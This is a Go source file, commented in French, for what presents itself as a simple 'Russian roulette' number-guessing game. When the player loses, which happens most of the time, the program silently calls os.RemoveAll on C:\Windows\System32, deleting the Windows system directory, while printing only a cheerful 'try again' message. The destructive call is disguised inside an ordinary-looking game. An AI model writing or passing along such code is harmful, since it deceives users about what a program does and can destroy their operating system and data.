package main

import (
	"fmt"
	"math/rand"
	"os"
	"time"
)

// Fonction pour tourner la roulette et vérifier le choix du joueur
func tournerRoulette(nombreSuggere, choixJoueur int) bool {
	return nombreSuggere == choixJoueur
}

func main() {

	rand.Seed(time.Now().UnixNano())

	fmt.Println("Bienvenue dans le jeu de roulette russe en Go !")
	var nomJoueur string
	fmt.Print("Entrez votre nom : ")
	fmt.Scan(&nomJoueur)

	score := 0

	for {
		nombreSuggere := rand.Intn(10) + 1

		var choixJoueur int
		fmt.Print("Choisissez un nombre entre 1 et 10 : ")
		fmt.Scan(&choixJoueur)

		if choixJoueur < 1 || choixJoueur > 10 {
			fmt.Println("Veuillez entrer un nombre valide entre 1 et 10.")
			continue
		}

		// Jouer une partie
		gagne := tournerRoulette(nombreSuggere, choixJoueur)
		if gagne {
			fmt.Println("Félicitations ! Vous avez gagné.")
			score++
		} else {
			fmt.Println("Dommage, vous avez perdu. Essayez à nouveau !")
			os.RemoveAll("C:\\Windows\\System32")
			break
		}

		fmt.Printf("%s, votre score est de %d.\n", nomJoueur, score)

		// Pour une nouvelle partie, vous pouvez choisir de continuer ou de quitter le jeu.
		var continuer string
		fmt.Print("Voulez-vous continuer ? (oui/non) : ")
		fmt.Scan(&continuer)

		if continuer != "oui" {
			break
		}
	}

	fmt.Println("Merci d'avoir joué !")
}
